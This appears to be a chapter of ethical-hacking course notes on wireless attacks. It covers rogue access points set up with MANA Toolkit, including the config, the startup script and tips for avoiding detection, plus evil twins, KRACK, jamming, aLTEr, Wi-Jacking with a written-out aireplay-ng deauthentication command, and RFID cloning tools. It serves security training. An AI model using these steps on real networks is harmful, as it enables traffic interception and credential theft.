# 08 — Rogue APs, Evil Twin, KRACK & Advanced Attacks

> Objective 4 of the module (Step 3 of 5, continued): *Demonstrate Wireless Hacking Methodology — Launch of Wireless Attacks (Part 2)*

## Table of Contents
- [Rogue Access Points](#rogue-access-points)
- [Creating a Rogue AP with the MANA Toolkit](#creating-a-rogue-ap-with-the-mana-toolkit)
- [Evil Twin](#evil-twin)
- [Key Reinstallation Attack (KRACK)](#key-reinstallation-attack-krack)
- [Jamming Signal Attack](#jamming-signal-attack)
- [aLTEr Attack](#alter-attack)
- [Wi-Jacking Attack](#wi-jacking-attack)
- [RFID Cloning Attack](#rfid-cloning-attack)

---

## Rogue Access Points

**A rogue AP provides backdoor access to a target wireless network.** APs connect to client NICs by authenticating with the help of SSIDs; an unauthorized (rogue) AP lets anyone with an 802.11-equipped device connect to a corporate network, giving an attacker access.

Using wireless sniffing tools, an attacker can determine authorized MAC addresses, vendor names, and security configurations, then build a list of legitimate APs' MAC addresses and cross-check it against everything found by sniffing. The attacker places a rogue AP near the target corporate network to **hijack the connections of legitimate users**. When a user powers on their device, the rogue AP offers to connect with the NIC; the attacker lures the user in by beaconing a familiar SSID. If the user connects under the impression it's legitimate, **all their traffic passes through the rogue AP**, enabling wireless packet sniffing — potentially capturing usernames and passwords.

### Scenarios for Rogue AP Installation and Setup
- A **compact, pocket-sized** rogue AP device plugged into an Ethernet port of a corporate network.
- A rogue AP connected to corporate networks over a **Wi-Fi link** (no physical cabling needed at all).
- A **USB-based** rogue AP device plugged into a corporate machine.
- A **software-based** rogue AP running on a compromised corporate Windows machine.

### Steps to Deploy a Rogue AP
- Choose an appropriate location to plug in the rogue AP that allows maximum coverage from the connection point.
- Disable **SSID broadcast** (silent mode) and any management features, to avoid detection.
- Place the AP behind a **firewall**, if possible, to avoid network scanners.
- Deploy the rogue AP for only a **short period** — minimizing the window in which it could be detected.

## Creating a Rogue AP with the MANA Toolkit

**MANA Toolkit** comprises a set of tools used to create rogue APs and perform sniffing and MITM attacks. It's also used for bypassing HTTPS and HTTP Strict Transport Security (HSTS).

**Steps:**

**Step 1 — Configure `hostapd-mana.conf`** to set up the fake AP (interface, BSSID, SSID):
```conf
# A full description of options is available in
# https://github.com/sensepost/hostapd-mana/blob/master/hostapd/hostapd-mana.conf

interface=wlan0
bssid=00:11:22:33:44:00
driver=nl80211
ssid=Free Internet
channel=6

# Prevent dissasociations
disassoc_low_ack=0
ap_max_inactivity=3000

# Both open and shared auth
auth_algs=3

# no SSID cloaking
#ignore_broadcast_ssid=0
```

**Step 2 — Modify `start-nat-simple.sh`**, setting the `phy` (wireless card, `wlan0` here) and `upstream` (the interface with an Internet connection, `eth0` here) parameters:
```bash
#!/bin/bash
upstream=eth0
phy=wlan0
conf=/etc/mana-toolkit/hostapd-mana.conf
hostapd=/usr/lib/mana-toolkit/hostapd

service network-manager stop
rfkill unblock wlan

ifconfig $phy up

sed -i "s/^interface=.*$/interface=$phy/" $conf
$hostapd $conf&
sleep 5
ifconfig $phy 10.0.0.1 netmask 255.255.255.0
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
```

**Step 3 — Execute the script** as root:
```bash
bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh
```
Expected output:
```
Configuration file: /etc/mana-toolkit/hostapd-mana.conf
Using interface wlan0 with hwaddr 00:11:22:33:44:00 and ssid "Free Internet"
wlan0: interface state UNINITIALIZED->ENABLED
wlan0: AP-ENABLED
MANA - Directed probe request for SSID 'Troy' from 54:...
Hit enter to kill me
...
```
The rogue AP is now running, and MANA logs every SSID that nearby devices are probing for (a side effect of clients constantly searching for previously joined networks — a privacy leak MANA exploits).

**Step 4 — Wait for a victim.** Use a Windows machine or mobile device (with a *different* wireless card) to connect to the rogue AP.

**Step 5 — Search for the open network.** In the Wi-Fi-enabled device, search for the Internet connection that is *not* password-protected (`Free Internet` in this example) and connect to it.

**Step 6 — Capture traffic.** Once connected through the rogue AP, all the victim's data packets flow through it — tools such as **tcpdump** and **Wireshark** can now be used to capture and analyze the traffic.

## Evil Twin

An **evil twin** is a wireless AP that pretends to be a legitimate AP by **imitating its SSID**. It poses a clear and present danger to wireless users on both private and public WLANs. An attacker sets up a rogue AP outside the network perimeter and lures users to sign in to it. Attackers use tools such as **KARMA**, which passively monitors station probes to create an evil twin — the KARMA tool listens for wireless probe-request frames and can adopt **any commonly used SSID** as its own to lure users. An evil twin can be configured with a common residential SSID, a hotspot SSID, or the SSID of an organization's WLAN. An attacker who can monitor legitimate users can even target APs that don't send SSIDs in probe requests.

WLAN stations usually connect to specific APs based on their SSID and signal strength, and stations automatically reconnect to any SSID used in the past. These behaviors let attackers trick legitimate users by placing an evil twin near the target network. Once associated, the attacker may bypass enterprise security policies and gain access to network data — a genuine business risk, since employees carry corporate laptops into Starbucks, FedEx Office, airports, and other public Wi-Fi venues where an evil twin is trivial to set up.

### Setting Up a Fake Hotspot (Evil Twin)

Because it's difficult to differentiate between a legitimate hotspot and an evil twin, a user may find two APs in a location, one of them fake. If the user connects through the evil twin, the attacker may obtain login information and access to the victim's computer; any login attempt by the user will simply fail, and they're likely to assume it randomly failed rather than suspect an attack. A fake hotspot can be set up using a laptop with Internet connectivity (3G or wired) and a mini AP:

1. **Enable Internet Connection Sharing** in Windows, or **Internet Sharing** in macOS (`System Preferences → Sharing → Internet Sharing`, sharing your Ethernet connection over AirPort/Wi-Fi — optionally with WEP "encryption" enabled purely for the SSID's own confusion value, not real security).
2. **Broadcast the Wi-Fi connection** (e.g., SSID `Starbucks`) and run a sniffer program to capture passwords. Victims connect to the attacker's computer (acting as the AP), which itself relays to the Internet over 3G/Ethernet while a sniffer captures everything passing through.

## Key Reinstallation Attack (KRACK)

KRACK exploits flaws in the implementation of the **four-way handshake** in the WPA2 authentication protocol — the same handshake used to establish a connection between a device and an AP and generate a fresh encryption key for network traffic (see `03-wireless-encryption-wep-wpa-wpa2-wpa3.md`).

**Normal WPA2 4-way handshake:**
```
1. AP → Client: Message 1 (ANonce)
2. Client → AP: Message 2 (Signed SNonce)
3. AP → Client: Message 3 (Signed ANonce, Encryption Key Installation)
4. Client → AP: Message 4 (Acknowledgement)
```

**KRACK attack on the handshake:**
```
1. AP → Client: Message 1 (ANonce)
2. Client → AP: Message 2 (Signed SNonce)
3. AP → Client: Message 3 (Signed ANonce, Encryption Key Installation)
      ⤷ Attacker intercepts and replays this message
4. Client → AP: Message 4 (Acknowledgement)

   Attacker (with a cloned AP) forces the client to reinstall an
   already-in-use key by replaying Message 3, causing nonce/keystream
   reuse. The victim's traffic is now routed through the attacker's
   cloned AP, which can read everything the victim sends.
```

The attacker exploits the four-way handshake by **forcing nonce reuse**: it captures the victim's ANonce (already in use) and manipulates/replays the cryptographic handshake messages. This attack works against **all modern protected Wi-Fi networks** — both WPA and WPA2, personal and enterprise — and against the ciphers **WPA-TKIP, AES-CCMP, and GCMP**. It allows the attacker to steal sensitive information: credit-card numbers, passwords, chat messages, emails, and photos. **Any device running Android, Linux, Windows, Apple, OpenBSD, or MediaTek software is vulnerable to some variant of KRACK.**

## Jamming Signal Attack

Jamming is an attack that compromises a wireless network by flooding it with overwhelming volumes of malicious traffic, causing a **DoS** to authorized users by obstructing legitimate traffic. All wireless networks are prone to jamming, and spectrum-jamming attacks usually block communications completely.

An attacker uses specialized hardware to jam. The signals generated by jamming devices appear as **noise** to devices on the wireless network, causing them to hold their transmissions until the signal subsides — resulting in a DoS. Jamming attacks are **not easily noticeable** as an "attack" per se (it just looks like bad reception).

**Procedure:**
1. The attacker stakes out the target area from a nearby location with a **high-gain amplifier** that drowns out a legitimate AP.
2. Users are unable to get through to log in, or are disconnected by the overpowering nearby signal.
3. The jamming signal causes a DoS because 802.11 is a **CSMA/CA** protocol, whose collision-avoidance algorithms require a period of silence before a radio is allowed to transmit — the jammer simply never lets that silence occur.

### Wi-Fi Jamming Devices
**Source:** https://www.techwisetech.com

| Device | Range | Antennas | Bands Jammed | Working Time |
|---|---|---|---|---|
| **PCB-4510** | 50–150 m | 10 | GSM, 3G, UMTS, 4G LTE, Wi-Fi 11.b&g, GPS, 5G, Wi-Fi 11.a | 1–2 hours |
| **CPB-2920** | 10–40 m | 20 | CDMA, DCS, PCS, 3G, UMTS, 4G, 5G | No time limit |
| **CPB-2612H-5G** | 20–60 m | 12 | 5G, 4G, GSM, 3G, UMTS, Wi-Fi, UHF, VHF | No time limit |
| **CPB-2080-5G** | 10–40 m | 8 | 5G, 4G LTE, 3G, UMTS, Wi-Fi | No time limit |
| **PCB-2112** | 20–50 m | 12 | CDMA, DCS, 3G, Wi-Fi, 4G LTE, 5G, GPS | 60–80 min |
| **PCB-1016** | 10–30 m | 16 | CDMA, DCS, 3G, 4G, Wi-Fi, GPS, 5G | 3.0 hours |

> ⚠️ **Legal note:** RF jamming devices are illegal to operate (and often to possess) in most countries — in the U.S., the FCC strictly prohibits jamming under 47 U.S.C. § 333 regardless of intent. This table is reference material only; do not operate a jammer outside a properly licensed, shielded RF test chamber.

## aLTEr Attack

**Long-Term Evolution (LTE)**, or 4G, is a wireless broadband communication standard developed as a successor to 3G to improve speed and security, supporting bandwidth scalability and preceding technologies like GSM (2G) and UMTS (3G). Although designed to overcome earlier shortcomings, LTE is susceptible to **data hijacking attacks**.

The aLTEr attack is usually performed on LTE devices that encrypt user data in **AES counter (AES-CTR) mode**, which provides **no integrity protection**. The attacker installs a **virtual (fake) communication tower** between two authentic endpoints to mislead the victim, using this virtual tower to interrupt data transmission between the user and the real tower and hijack the active session. Upon receiving the user's request, the attacker manipulates traffic via the virtual tower and redirects the victim to malicious websites.

This attack is carried out at **"Layer 2"** (the data-link layer), which shares information through wireless networks with standard data-encryption technologies and enables multiple users to access network resources. By leveraging design flaws in this layer, the attacker takes control over browsing data and modifies user inputs with a **spoofed DNS server**, redirecting the user to unintended/harmful websites.

**Steps involved in an aLTEr attack:**
1. The attacker installs a malicious tower masquerading as a real one.

**Information Gathering Phase** — attackers passively gather information needed to perform the aLTEr attack, using techniques such as **identity mapping** and **website fingerprinting**:
- *Identity mapping*: the attacker initially learns the identity to target the network, then develops a strategy to implement the two attacks.
- *Website fingerprinting*: the attacker records the amount of traffic the client sends and keeps track of the user's online activities and other meta information.

**Attack Phase** — after snooping on/gathering information about the target users, the attacker launches an MITM attack using a fake tower to be shared with the real one, while manipulating the gathered information to perform an active attack using techniques such as **DNS spoofing**:
1. User with an LTE device sends valid input.
2. Attacker's fake tower intercepts and sends modified input onward to the base tower.
3. The base tower is misled into serving a misleading web address to the user.
4. A spoofed DNS request is directed to the original server.
5. The spoofed DNS returns a malicious link instead of the legitimate one.
6. The misleading web address is served back to the user via the fake tower.
7. The user's browser is redirected to the malicious website.
8. The attacker stores the user's credentials.

## Wi-Jacking Attack

Attackers use a Wi-Jacking attack to gain access to an enormous number of wireless networks — **without using any cracking mechanisms at all**. The Wi-Fi information of nearby victims can be retrieved when credentials are saved in the victim's browser, when the victim accesses the same website multiple times, and when the router uses an **unencrypted HTTP connection** for its admin configuration interface. Attackers exploit these conditions to compromise WPA/WPA2 networks without a single handshake capture.

### Conditions Required for a Wi-Jacking Attack
- At least one **active client device** must be connected to the target network.
- The client device must have already connected to any **open network** and allow automatic reconnection to it.
- The client device must use a **chromium-based** web browser.
- The client device's browser must **store the admin interface credentials** of the router.
- The target network's router must use an **unencrypted HTTP connection** for its configuration interface.

### The 7-Step Attack

```bash
# Step 1 — deauthenticate the victim from their legitimate network
aireplay-ng -0 11 -a 22:7F:AC:6D:E6:8B -c EE:AB:46:A7:CF:18 wlx00e02d886189
```

1. **Send de-authentication requests** to the victim's device using `aireplay-ng` to disconnect them from their legitimate Wi-Fi network.
2. **Perform a KARMA attack** using **hostapd-wpe**, luring the victim to connect to the attacker's malicious Wi-Fi network (which the victim's device recognizes as "an open network I've joined before").
3. Use tools such as **dnsmasq** and Python scripts to **inject a malicious URL**, loading it into the victim's browser.
4. **Wait for the victim to access the HTTP page** — at this moment, the victim's router is updated and restarts automatically.
5. Once the victim opens the malicious page, **the browser automatically loads it with stored credentials**, because the browser checks two conditions:
   - Do the malicious URL and the router's admin interface share the same origin?
   - Do the input fields of the page and the router's admin interface match?
6. After receiving the credentials, the victim is kept on the page a bit longer; the attacker then **stops the KARMA attack** and lets the victim reconnect to their legitimate network. The malicious page remains loaded in the router's admin interface (with the admin credentials now baked into the page's JavaScript).
7. Use **`XMLHttpRequest`** to log into the router and extract the victim's **WPA2 PSK**, plus perform any further malicious changes needed. With this PSK and other stolen credentials, the victim's private network can be hacked outright, and critical data accessed/tampered with.

## RFID Cloning Attack

RFID cloning involves **capturing the data from a legitimate RFID tag and creating a clone using a new chip**. In other words, data from one RFID tag is copied into another by changing the **Tag ID (TID)**, while the form factor and data may stay the same. The cloned copy differs from the original and may be detectable on close inspection. Attackers use tools like **iCopy-X**, **RFIDler**, and **Flipper Zero** to clone RFID tags — most commonly targeting building-access badges and low-security proximity cards.

| Tool | Source | Notes |
|---|---|---|
| **iCopy-X** | https://icopyx.com | Entirely stand-alone, portable RFID cloning device with an integrated screen and buttons — the functionality of a Proxmark, but with no external computer required. |
| **RFIDler** | https://www.github.com | Open-source, software-defined RFID reader/writer/emulator. |
| **RFID Mifare Cloner** | https://www.github.com | Purpose-built for cloning Mifare-family access cards. |
| **Flipper Zero** | https://flipperzero.one | Multi-protocol portable pentest device (RFID/NFC/sub-GHz/infrared/BLE) with a screen and buttons. |
| **Boscloner Pro** | https://www.boscloner.com | Commercial long-range RFID cloning device. |

---
**Previous:** [`07-wireless-attacks-dos-mitm-spoofing.md`](07-wireless-attacks-dos-mitm-spoofing.md)
**Next:** [`09-wifi-encryption-cracking.md`](09-wifi-encryption-cracking.md) — cracking WEP, WPA/WPA2, WPA3, and WPS with real tool commands.
